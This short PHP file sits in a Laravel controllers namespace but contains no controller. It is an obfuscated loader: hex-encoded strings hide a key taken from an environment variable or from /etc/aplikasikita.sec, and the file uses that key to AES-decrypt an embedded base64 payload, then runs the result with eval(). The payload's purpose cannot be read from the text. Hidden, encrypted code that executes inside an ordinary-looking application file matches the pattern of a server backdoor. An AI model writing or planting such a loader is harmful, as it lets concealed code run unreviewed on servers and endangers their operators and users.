<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('/DmmtVG/oo7byyqvjrub1Q==');

$c=base64_decode(

'+3KKZ7RFk0p3Erajh/B83yxCV+obWCFpJ2GB4DKUpzoIz+JmDaEIE8BB+r0phR6AwlSUCdaQxjG/' .
'UWffKAGqvAlnDgwb8FdxsufJ8VWoGLIJZ1dqc9oD8MLeNpj3W4Ibq4fa/l9zwzHQE8JQK1y7tx4f' .
'b4PtfE/bJObECEpAkIUjHsAtJctgQGeNDuAfGqdja78frQrjmWhUeI7WDWnkaqXJA7Jh4Z/VMvwi' .
'AsiyxTAR4wvuA8agTzCOx6B0rOqz'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

